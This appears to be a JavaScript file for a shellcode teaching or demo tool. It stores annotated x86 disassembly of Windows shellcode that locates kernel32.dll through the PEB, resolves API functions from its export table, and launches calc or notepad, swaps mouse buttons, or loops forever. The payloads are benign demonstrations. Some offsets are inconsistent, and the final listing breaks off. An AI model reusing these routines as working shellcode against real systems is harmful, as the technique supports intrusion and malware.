var CreateProcessCalcDisas = 
`Section 1: Find base address of kernel32.dll

    0:  31 c0                   xor    eax,eax                                                // EAX = 0
    2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]       // EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
    6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]             // EBX = PEB_LDR_DATA // using offset 0xc
    9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
    c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
    e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
    10: 8b 43 10             mov    eax,DWORD PTR [ebx+0x10]          // EAX = base address of kernel32.dll // using offset 0x10 from EBX

    13: 8b 78 3c              mov    edi,DWORD PTR [eax+0x3c]          // EDI = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    16: 01 c7                   add    edi,eax                                              // EDI = Address of PE signature = base address + RVA of PE signature
    18: 8b 57 78              mov    edx,DWORD PTR [edi+0x78]          // EDI = RVA of Export Table = Address of PE + offset 0x78
    1b: 01 c2                   add    edx,eax                                             // EDI = Address of Export Table = base address + RVA of export table
    1d: 8b 7a 20              mov    edi,DWORD PTR [edx+0x20]          // EDI = RVA of Name Pointer Table = Address of Export Table + 0x20
    20: 01 c7                   add    edi,eax                                              // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table

    22: 31 db                   xor    ebx,ebx                                              // EBX = 0
    24: 89 dd                   mov    ebp,ebx                                            // EBP = 0

Section 2: Find CreateProcessA()
    loop:
    26: 8b 34 af                        mov    esi,DWORD PTR [edi+ebp*4]         // ESI = PTR to the exported function name
    29: 01 c6                            add    esi,eax                                             // ...
    2b: 45                                 inc    ebp                                                    // Increment EBP
    2c: 81 3e 43 72 65 61       cmp    DWORD PTR [esi],0x61657243      // Name starts with 'Crea'
    32: 75 f2                             jne    0x26                                                 // Jump to start of loop if its not equal
    34: 81 7e 08 6f 63 65 73   cmp    DWORD PTR [esi+0x8],0x7365636f   // Name has 'oces' at char 9 ?
    3b: 75 e9                            jne    0x26                                                  // Jump to start of loop if its not equal
    3d: 8b 7a 24                       mov    edi,DWORD PTR [edx+0x24]         // EDI = VA of the Ordinals table
    40: 01 c7                            add    edi,eax                                             // ...
    42: 66 8b 2c 6f                   mov    bp,WORD PTR [edi+ebp*2]            // BP = Ordinal number of CreateProcessA
    46: 8b 7a 1c                       mov    edi,DWORD PTR [edx+0x1c]         // EDI = VA of the Entry Points Table
    49: 01 c7                            add    edi,eax                                             // ...
    4b: 8b 7c af fc                    mov    edi,DWORD PTR [edi+ebp*4-0x4]  // EDI = VA of CreateProcessA
    4f: 01 c7                             add    edi,eax                                             // ...

    Zero memory:
    51: 89 d9                 mov    ecx,ebx                        // Clear the stack
    53: b1 ff                   mov    cl,0xff
    55: 53                      push   ebx                              // Push 0
    56: e2 fd                  loop   0x55                             // 255 times

Section 3: Specify function parameters and call function
    Push parameters:
    58: 68 63 61 6c 63  push   0x636c6163                  // 'Calc'
    5d: 89 e2                 mov    edx,esp                        // EDX = 'Calc'
    5f: 52                       push   edx                               // Push EDX
    60: 52                      push   edx                               // Push EDX
    61: 53                      push   ebx                               // Push EBX
    62: 53                      push   ebx                               // Push EBX
    63: 53                      push   ebx                               // Push EBX
    64: 53                      push   ebx                               // Push EBX
    65: 53                      push   ebx                               // Push EBX
    66: 53                      push   ebx                               // Push EBX
    67: 52                      push   edx                               // Push EDX
    68: 53                      push   ebx                               // Push EBX
    69: ff d7                   call   edi                                  // Call CreateProcessA(Calc)`;

var CreateProcessCalcDisasHalt = 
`Section 1: Find base address of kernel32.dll

    0:  31 c0                   xor    eax,eax                                                // EAX = 0
    2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]       // EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
    6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]             // EBX = PEB_LDR_DATA // using offset 0xc
    9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
    c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
    e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
    10: 8b 43 10             mov    eax,DWORD PTR [ebx+0x10]          // EAX = base address of kernel32.dll // using offset 0x10 from EBX

    13: 8b 78 3c              mov    edi,DWORD PTR [eax+0x3c]          // EDI = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    16: 01 c7                   add    edi,eax                                              // EDI = Address of PE signature = base address + RVA of PE signature
    18: 8b 57 78              mov    edx,DWORD PTR [edi+0x78]          // EDI = RVA of Export Table = Address of PE + offset 0x78
    1b: 01 c2                   add    edx,eax                                             // EDI = Address of Export Table = base address + RVA of export table
    1d: 8b 7a 20              mov    edi,DWORD PTR [edx+0x20]          // EDI = RVA of Name Pointer Table = Address of Export Table + 0x20
    20: 01 c7                   add    edi,eax                                              // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table

    22: 31 db                   xor    ebx,ebx                                              // EBX = 0
    24: 89 dd                   mov    ebp,ebx                                            // EBP = 0

Section 2: Find CreateProcessA()
    loop:
    26: 8b 34 af                        mov    esi,DWORD PTR [edi+ebp*4]         // ESI = PTR to the exported function name
    29: 01 c6                            add    esi,eax                                             // ...
    2b: 45                                 inc    ebp                                                    // Increment EBP
    2c: 81 3e 43 72 65 61       cmp    DWORD PTR [esi],0x61657243      // Name starts with 'Crea'
    32: 75 f2                             jne    0x26                                                 // Jump to start of loop if its not equal
    34: 81 7e 08 6f 63 65 73   cmp    DWORD PTR [esi+0x8],0x7365636f   // Name has 'oces' at char 9 ?
    3b: 75 e9                            jne    0x26                                                  // Jump to start of loop if its not equal
    3d: 8b 7a 24                       mov    edi,DWORD PTR [edx+0x24]         // EDI = VA of the Ordinals table
    40: 01 c7                            add    edi,eax                                             // ...
    42: 66 8b 2c 6f                   mov    bp,WORD PTR [edi+ebp*2]            // BP = Ordinal number of CreateProcessA
    46: 8b 7a 1c                       mov    edi,DWORD PTR [edx+0x1c]         // EDI = VA of the Entry Points Table
    49: 01 c7                            add    edi,eax                                             // ...
    4b: 8b 7c af fc                    mov    edi,DWORD PTR [edi+ebp*4-0x4]  // EDI = VA of CreateProcessA
    4f: 01 c7                             add    edi,eax                                             // ...

    Zero memory:
    51: 89 d9                 mov    ecx,ebx                        // Clear the stack
    53: b1 ff                   mov    cl,0xff
    55: 53                      push   ebx                              // Push 0
    56: e2 fd                  loop   0x55                             // 255 times

Section 3: Specify function parameters and call function
    Push parameters:
    58: 68 63 61 6c 63  push   0x636c6163                  // 'Calc'
    5d: 89 e2                 mov    edx,esp                        // EDX = 'Calc'
    5f: 52                       push   edx                               // Push EDX
    60: 52                      push   edx                               // Push EDX
    61: 53                      push   ebx                               // Push EBX
    62: 53                      push   ebx                               // Push EBX
    63: 53                      push   ebx                               // Push EBX
    64: 53                      push   ebx                               // Push EBX
    65: 53                      push   ebx                               // Push EBX
    66: 53                      push   ebx                               // Push EBX
    67: 52                      push   edx                               // Push EDX
    68: 53                      push   ebx                               // Push EBX
    69: ff d7                   call   edi                                  // Call CreateProcessA(Calc)
    70: e9 fb ff ff ff         jmp    0x61fccd                       // Jump to this line (Effectively entering an infinite loop)`;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------

var CreateProcessNotepadDisas = 
`Section 1: Find base address of kernel32.dll

    0:  31 c0                   xor    eax,eax                                                // EAX = 0
    2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]       // EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
    6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]             // EBX = PEB_LDR_DATA // using offset 0xc
    9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
    c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
    e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
    10: 8b 43 10             mov    eax,DWORD PTR [ebx+0x10]          // EAX = base address of kernel32.dll // using offset 0x10 from EBX

    13: 8b 78 3c              mov    edi,DWORD PTR [eax+0x3c]          // EDI = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    16: 01 c7                   add    edi,eax                                              // EDI = Address of PE signature = base address + RVA of PE signature
    18: 8b 57 78              mov    edx,DWORD PTR [edi+0x78]          // EDI = RVA of Export Table = Address of PE + offset 0x78
    1b: 01 c2                   add    edx,eax                                             // EDI = Address of Export Table = base address + RVA of export table
    1d: 8b 7a 20              mov    edi,DWORD PTR [edx+0x20]          // EDI = RVA of Name Pointer Table = Address of Export Table + 0x20
    20: 01 c7                   add    edi,eax                                              // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table

    22: 31 db                   xor    ebx,ebx                                              // EBX = 0
    24: 89 dd                   mov    ebp,ebx                                            // EBP = 0

Section 2: Find CreateProcessA()
    loop:
    26: 8b 34 af                        mov    esi,DWORD PTR [edi+ebp*4]         // ESI = PTR to the exported function name
    29: 01 c6                            add    esi,eax                                             // ...
    2b: 45                                 inc    ebp                                                    // Increment EBP
    2c: 81 3e 43 72 65 61       cmp    DWORD PTR [esi],0x61657243      // Name starts with 'Crea'
    32: 75 f2                             jne    0x26                                                 // Jump to start of loop if its not equal
    34: 81 7e 08 6f 63 65 73   cmp    DWORD PTR [esi+0x8],0x7365636f   // Name has 'oces' at char 9 ?
    3b: 75 e9                            jne    0x26                                                  // Jump to start of loop if its not equal
    3d: 8b 7a 24                       mov    edi,DWORD PTR [edx+0x24]         // EDI = VA of the Ordinals table
    40: 01 c7                            add    edi,eax                                             // ...
    42: 66 8b 2c 6f                   mov    bp,WORD PTR [edi+ebp*2]            // BP = Ordinal number of CreateProcessA
    46: 8b 7a 1c                       mov    edi,DWORD PTR [edx+0x1c]         // EDI = VA of the Entry Points Table
    49: 01 c7                            add    edi,eax                                             // ...
    4b: 8b 7c af fc                    mov    edi,DWORD PTR [edi+ebp*4-0x4]  // EDI = VA of CreateProcessA
    4f: 01 c7                             add    edi,eax                                             // ...

    Zero memory:
    51: 89 d9                 mov    ecx,ebx                        // Clear the stack
    53: b1 ff                   mov    cl,0xff
    55: 53                      push   ebx                              // Push 0
    56: e2 fd                  loop   0x55                             // 255 times

Section 3: Specify function parameters and call function
    Push parameters:
    57: 68 70 61 64 61   push   0x61646170                 // adap
    58: 66 83 6c 24 03 61   sub    WORD PTR [esp+0x3],0x61        // Remove additional character "a"
    59: 68 6e 6f 74 65   push   0x65746f6e                  // etoN
    5f: 52                       push   edx                               // Push EDX
    60: 52                      push   edx                               // Push EDX
    61: 53                      push   ebx                               // Push EBX
    62: 53                      push   ebx                               // Push EBX
    63: 53                      push   ebx                               // Push EBX
    64: 53                      push   ebx                               // Push EBX
    65: 53                      push   ebx                               // Push EBX
    66: 53                      push   ebx                               // Push EBX
    67: 52                      push   edx                               // Push EDX
    68: 53                      push   ebx                               // Push EBX
    69: ff d7                   call   edi                                  // Call CreateProcessA(Notepad)`;

var CreateProcessNotepadDisasHalt = 
`Section 1: Find base address of kernel32.dll

    0:  31 c0                   xor    eax,eax                                                // EAX = 0
    2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]       // EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
    6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]             // EBX = PEB_LDR_DATA // using offset 0xc
    9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
    c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
    e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
    10: 8b 43 10             mov    eax,DWORD PTR [ebx+0x10]          // EAX = base address of kernel32.dll // using offset 0x10 from EBX

    13: 8b 78 3c              mov    edi,DWORD PTR [eax+0x3c]          // EDI = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    16: 01 c7                   add    edi,eax                                              // EDI = Address of PE signature = base address + RVA of PE signature
    18: 8b 57 78              mov    edx,DWORD PTR [edi+0x78]          // EDI = RVA of Export Table = Address of PE + offset 0x78
    1b: 01 c2                   add    edx,eax                                             // EDI = Address of Export Table = base address + RVA of export table
    1d: 8b 7a 20              mov    edi,DWORD PTR [edx+0x20]          // EDI = RVA of Name Pointer Table = Address of Export Table + 0x20
    20: 01 c7                   add    edi,eax                                              // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table

    22: 31 db                   xor    ebx,ebx                                              // EBX = 0
    24: 89 dd                   mov    ebp,ebx                                            // EBP = 0

Section 2: Find CreateProcessA()
    loop:
    26: 8b 34 af                        mov    esi,DWORD PTR [edi+ebp*4]         // ESI = PTR to the exported function name
    29: 01 c6                            add    esi,eax                                             // ...
    2b: 45                                 inc    ebp                                                    // Increment EBP
    2c: 81 3e 43 72 65 61       cmp    DWORD PTR [esi],0x61657243      // Name starts with 'Crea'
    32: 75 f2                             jne    0x26                                                 // Jump to start of loop if its not equal
    34: 81 7e 08 6f 63 65 73   cmp    DWORD PTR [esi+0x8],0x7365636f   // Name has 'oces' at char 9 ?
    3b: 75 e9                            jne    0x26                                                  // Jump to start of loop if its not equal
    3d: 8b 7a 24                       mov    edi,DWORD PTR [edx+0x24]         // EDI = VA of the Ordinals table
    40: 01 c7                            add    edi,eax                                             // ...
    42: 66 8b 2c 6f                   mov    bp,WORD PTR [edi+ebp*2]            // BP = Ordinal number of CreateProcessA
    46: 8b 7a 1c                       mov    edi,DWORD PTR [edx+0x1c]         // EDI = VA of the Entry Points Table
    49: 01 c7                            add    edi,eax                                             // ...
    4b: 8b 7c af fc                    mov    edi,DWORD PTR [edi+ebp*4-0x4]  // EDI = VA of CreateProcessA
    4f: 01 c7                             add    edi,eax                                             // ...

    Zero memory:
    51: 89 d9                 mov    ecx,ebx                        // Clear the stack
    53: b1 ff                   mov    cl,0xff
    55: 53                      push   ebx                              // Push 0
    56: e2 fd                  loop   0x55                             // 255 times

Section 3: Specify function parameters and call function
    Push parameters:
    57: 68 70 61 64 61   push   0x61646170                 // adap
    58: 66 83 6c 24 03 61   sub    WORD PTR [esp+0x3],0x61        // Remove additional character "a"
    59: 68 6e 6f 74 65   push   0x65746f6e                  // etoN
    5f: 52                       push   edx                               // Push EDX
    60: 52                      push   edx                               // Push EDX
    61: 53                      push   ebx                               // Push EBX
    62: 53                      push   ebx                               // Push EBX
    63: 53                      push   ebx                               // Push EBX
    64: 53                      push   ebx                               // Push EBX
    65: 53                      push   ebx                               // Push EBX
    66: 53                      push   ebx                               // Push EBX
    67: 52                      push   edx                               // Push EDX
    68: 53                      push   ebx                               // Push EBX
    69: ff d7                   call   edi                                  // Call CreateProcessA(Notepad)
    70: e9 fb ff ff ff         jmp    0x61fccd                       // Jump to this line (Effectively entering an infinite loop)`;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------

var SwapMouseButtonOnDisas =
`Section 1: Find kernel32.dll base address

    0: 31 c0                        xor    eax,eax                                           // EAX = 0
    1: 64 8b 60 08              mov    esp,DWORD PTR fs:[eax+0x8]    // Move Segment:Offset(base) to ESP
    2: 8d 2c 24                   lea    ebp,[esp]                                         // Load effective address specified by ESP to EBP (Creates virtual stack)
    3: 31 c0                        xor    eax,eax                                           // EAX = 0
    4: 64 8b 58 30              mov    ebx,DWORD PTR fs:[eax+0x30]  // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
    5: 8b 5b 0c                   mov    ebx,DWORD PTR [ebx+0xc]        // EBX = PEB_LDR_DATA // Using offset 0xc
    6: 8b 5b 14                   mov    ebx,DWORD PTR [ebx+0x14]     // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
    7: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Second list entry (ntdll.dll)
    8: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Third list entry (kernel32.dll)
    9: 8b 5b 10                   mov    ebx,DWORD PTR [ebx+0x10]     // EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

    10: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]     // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    11: 03 d3                     add    edx,ebx                                        // EDX = Address of PE signature = base address + RVA of PE signature
    12: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]    // EDX = RVA of Export Table = Address of PE + offset 0x78
    13: 03 d3                     add    edx,ebx                                        // EDX = Address of Export Table = base address + RVA of export table
    14: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]     // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
    15: 03 f3                      add    esi,ebx                                         // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
    16: 33 c9                     xor    ecx,ecx                                         // ECX = 0

   loopSearch:
    17: 41                               inc    ecx                                                            // Increment counter ECX
    18: ad                               lods   eax,DWORD PTR ds:[esi]                       // Load next list entry into EAX
    19: 01 d8                          add    eax,ebx                                                   // EAX = Address of Entry = base address + Address of Entry
    20: 81 38 47 65 74 50      cmp    DWORD PTR [eax],0x50746547           // Compare first byte to GetP
    21: 75 f4                            jne    0x2d                                                        // Start over if not equal
    22: 81 78 04 72 6f 63 41  cmp    DWORD PTR [eax+0x4],0x41636f72    // Compare second byte to rocA
    23: 75 eb                           jne    0x2d                                                        // Start over if not equal

   getProcAddressFunc:
    24: 8b 7a 24             mov    edi,DWORD PTR [edx+0x24]        // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
    25: 01 df                   add    edi,ebx                                            // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
    26: 66 8b 0c 4f         mov    cx,WORD PTR [edi+ecx*2]            // CX = Number of Function = Address of Ordinal Table + Counter * 2
    27: 49                       dec    ecx                                                  // Decrement ECX (As name ordinals starts from 0)
    28: 8b 7a 1c             mov    edi,DWORD PTR [edx+0x1c]        // EDI = Offset address table
    29: 01 df                   add    edi,ebx                                           // EDI = Offset address table
    30: 8b 3c 8f              mov    edi,DWORD PTR [edi+ecx*4]       // EDI = Pointer(Offset)
    31: 01 df                   add    edi,ebx                                           // EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

    32: 31 c9                       xor    ecx,ecx                         // ECX = 0
    33: 51                            push   ecx                             // Push ECX onto stack
    34: 68 61 72 79 41        push   0x41797261               //
    35: 68 4c 69 62 72        push   0x7262694c               // AyrarbiLdaoL
    36: 68 4c 6f 61 64         push   0x64616f4c                //
    37: 54                            push   esp                            // "LoadLibraryA"
    38: 53                            push   ebx                            // "Kernel32.dll"
    39: ff d7                         call   edi                               // GetProcAddress(Kernel32.dll,LoadLibraryA)

   getUser32:
    40: 68 6c 6c 61 61              push   0x61616c6c                                    // aall
    41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161       // Remove additional characters "aa"
    42: 68 33 32 2e 64              push   0x642e3233                                   // d.32
    43: 68 55 73 65 72              push   0x72657355                                   // resU
    44: 54                                  push   esp                                                 // User32.dll
    45: ff d0                               call   eax                                                   // Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

    46: 68 74 6f 6e 61           push   0x616e6f74						// anot
    47: 83 6c 24 03 61          sub    DWORD PTR [esp+0x3],0x61			// Remove "a"
    48: 68 65 42 75 74          push   0x74754265						// tuBe
    49: 68 4d 6f 75 73           push   0x73756f4d						// suoM
    50: 68 53 77 61 70          push   0x70617753						// pawS
    51: 54                              push   esp								// "SwapMouseButton"
    52: 50                              push   eax								// user32.dll address
    53: ff d7                           call   edi								// GetProcAddress(User32.dll, SwapMouseButton)

Section 6: Call SwapMouseButton

    54: 83 c4 14            add    esp,0x14							// Clean stack
    55: 33 c9                 xor    ecx,ecx							// ECX = 0
    56: 41                      inc    ecx								// ECX = 1
    57: 51                      push   ecx								// Set to true
    58: ff d0                   call   eax								// Swap

Section 7: Get ExitProcess function address

    59: 83 c4 10                 add    esp,0x10							// Clean Stack
    60: 68 65 73 73 61       push   0x61737365						// asse
    61: 66 83 6c 24 03 61  sub    WORD PTR [esp+0x3],0x61			// Remove the 'a'
    62: 68 50 72 6f 63        push   0x636f7250						        // corP
    63: 68 45 78 69 74       push   0x74697845						// tixE
    64: 54                           push   esp								// "ExitProcess"
    65: 53                           push   ebx								// "Kernel32.dll"
    66: ff d7                        call   edi								        // GetProcAddress(Kernel32.dll, ExitProcess)

Section 8: Call the ExitProcess function

    67: 31 c9                 xor    ecx,ecx							// ECX = 0
    68: 51                      push   ecx								// Push 0
    69: ff d0                   call   eax								// ExitProcess(0)`;

var SwapMouseButtonOffDisas =
`Section 1: Find kernel32.dll base address

    0: 31 c0                        xor    eax,eax                                           // EAX = 0
    1: 64 8b 60 08              mov    esp,DWORD PTR fs:[eax+0x8]    // Move Segment:Offset(base) to ESP
    2: 8d 2c 24                   lea    ebp,[esp]                                         // Load effective address specified by ESP to EBP (Creates virtual stack)
    3: 31 c0                        xor    eax,eax                                           // EAX = 0
    4: 64 8b 58 30              mov    ebx,DWORD PTR fs:[eax+0x30]  // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
    5: 8b 5b 0c                   mov    ebx,DWORD PTR [ebx+0xc]        // EBX = PEB_LDR_DATA // Using offset 0xc
    6: 8b 5b 14                   mov    ebx,DWORD PTR [ebx+0x14]     // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
    7: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Second list entry (ntdll.dll)
    8: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Third list entry (kernel32.dll)
    9: 8b 5b 10                   mov    ebx,DWORD PTR [ebx+0x10]     // EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

    10: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]     // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    11: 03 d3                     add    edx,ebx                                        // EDX = Address of PE signature = base address + RVA of PE signature
    12: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]    // EDX = RVA of Export Table = Address of PE + offset 0x78
    13: 03 d3                     add    edx,ebx                                        // EDX = Address of Export Table = base address + RVA of export table
    14: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]     // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
    15: 03 f3                      add    esi,ebx                                         // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
    16: 33 c9                     xor    ecx,ecx                                         // ECX = 0

    loopSearch:
    17: 41                               inc    ecx                                                            // Increment counter ECX
    18: ad                               lods   eax,DWORD PTR ds:[esi]                       // Load next list entry into EAX
    19: 01 d8                          add    eax,ebx                                                   // EAX = Address of Entry = base address + Address of Entry
    20: 81 38 47 65 74 50      cmp    DWORD PTR [eax],0x50746547           // Compare first byte to GetP
    21: 75 f4                            jne    0x2d                                                        // Start over if not equal
    22: 81 78 04 72 6f 63 41  cmp    DWORD PTR [eax+0x4],0x41636f72    // Compare second byte to rocA
    23: 75 eb                           jne    0x2d                                                        // Start over if not equal

    getProcAddressFunc:
    24: 8b 7a 24             mov    edi,DWORD PTR [edx+0x24]        // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
    25: 01 df                   add    edi,ebx                                            // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
    26: 66 8b 0c 4f         mov    cx,WORD PTR [edi+ecx*2]            // CX = Number of Function = Address of Ordinal Table + Counter * 2
    27: 49                       dec    ecx                                                  // Decrement ECX (As name ordinals starts from 0)
    28: 8b 7a 1c             mov    edi,DWORD PTR [edx+0x1c]        // EDI = Offset address table
    29: 01 df                   add    edi,ebx                                           // EDI = Offset address table
    30: 8b 3c 8f              mov    edi,DWORD PTR [edi+ecx*4]       // EDI = Pointer(Offset)
    31: 01 df                   add    edi,ebx                                           // EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

    32: 31 c9                       xor    ecx,ecx                         // ECX = 0
    33: 51                            push   ecx                             // Push ECX onto stack
    34: 68 61 72 79 41        push   0x41797261               //
    35: 68 4c 69 62 72        push   0x7262694c               // AyrarbiLdaoL
    36: 68 4c 6f 61 64         push   0x64616f4c                //
    37: 54                            push   esp                            // "LoadLibraryA"
    38: 53                            push   ebx                            // "Kernel32.dll"
    39: ff d7                         call   edi                               // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
    40: 68 6c 6c 61 61              push   0x61616c6c                                    // aall
    41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161       // Remove additional characters "aa"
    42: 68 33 32 2e 64              push   0x642e3233                                   // d.32
    43: 68 55 73 65 72              push   0x72657355                                   // resU
    44: 54                                  push   esp                                                 // User32.dll
    45: ff d0                               call   eax                                                   // Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

    46: 68 74 6f 6e 61           push   0x616e6f74						// anot
    47: 83 6c 24 03 61          sub    DWORD PTR [esp+0x3],0x61			// Remove "a"
    48: 68 65 42 75 74          push   0x74754265						// tuBe
    49: 68 4d 6f 75 73           push   0x73756f4d						// suoM
    50: 68 53 77 61 70          push   0x70617753						// pawS
    51: 54                              push   esp								// "SwapMouseButton"
    52: 50                              push   eax								// user32.dll address
    53: ff d7                           call   edi								// GetProcAddress(User32.dll, SwapMouseButton)

Section 6: Call SwapMouseButton

    54: 83 c4 14            add    esp,0x14							// Clean stack
    55: 33 c9                 xor    ecx,ecx							// ECX = 0
    57: 51                      push   ecx								// Set to false
    58: ff d0                   call   eax								// Swap

Section 7: Get ExitProcess function address

    59: 83 c4 10                 add    esp,0x10							// Clean Stack
    60: 68 65 73 73 61       push   0x61737365						// asse
    61: 66 83 6c 24 03 61  sub    WORD PTR [esp+0x3],0x61			// Remove the 'a'
    62: 68 50 72 6f 63        push   0x636f7250						        // corP
    63: 68 45 78 69 74       push   0x74697845						// tixE
    64: 54                           push   esp								// "ExitProcess"
    65: 53                           push   ebx								// "Kernel32.dll"
    66: ff d7                        call   edi								        // GetProcAddress(Kernel32.dll, ExitProcess)

Section 8: Call the ExitProcess function

    67: 31 c9                 xor    ecx,ecx							// ECX = 0
    68: 51                      push   ecx								// Push 0
    69: ff d0                   call   eax								// ExitProcess(0)`;

var SwapMouseButtonOnDisasNSE =
`Section 1: Find kernel32.dll base address

    0: 31 c0                        xor    eax,eax                                           // EAX = 0
    1: 64 8b 60 08              mov    esp,DWORD PTR fs:[eax+0x8]    // Move Segment:Offset(base) to ESP
    2: 8d 2c 24                   lea    ebp,[esp]                                         // Load effective address specified by ESP to EBP (Creates virtual stack)
    3: 31 c0                        xor    eax,eax                                           // EAX = 0
    4: 64 8b 58 30              mov    ebx,DWORD PTR fs:[eax+0x30]  // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
    5: 8b 5b 0c                   mov    ebx,DWORD PTR [ebx+0xc]        // EBX = PEB_LDR_DATA // Using offset 0xc
    6: 8b 5b 14                   mov    ebx,DWORD PTR [ebx+0x14]     // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
    7: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Second list entry (ntdll.dll)
    8: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Third list entry (kernel32.dll)
    9: 8b 5b 10                   mov    ebx,DWORD PTR [ebx+0x10]     // EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

    10: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]     // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    11: 03 d3                     add    edx,ebx                                        // EDX = Address of PE signature = base address + RVA of PE signature
    12: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]    // EDX = RVA of Export Table = Address of PE + offset 0x78
    13: 03 d3                     add    edx,ebx                                        // EDX = Address of Export Table = base address + RVA of export table
    14: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]     // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
    15: 03 f3                      add    esi,ebx                                         // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
    16: 33 c9                     xor    ecx,ecx                                         // ECX = 0

    loopSearch:
    17: 41                               inc    ecx                                                            // Increment counter ECX
    18: ad                               lods   eax,DWORD PTR ds:[esi]                       // Load next list entry into EAX
    19: 01 d8                          add    eax,ebx                                                   // EAX = Address of Entry = base address + Address of Entry
    20: 81 38 47 65 74 50      cmp    DWORD PTR [eax],0x50746547           // Compare first byte to GetP
    21: 75 f4                            jne    0x2d                                                        // Start over if not equal
    22: 81 78 04 72 6f 63 41  cmp    DWORD PTR [eax+0x4],0x41636f72    // Compare second byte to rocA
    23: 75 eb                           jne    0x2d                                                        // Start over if not equal

    getProcAddressFunc:
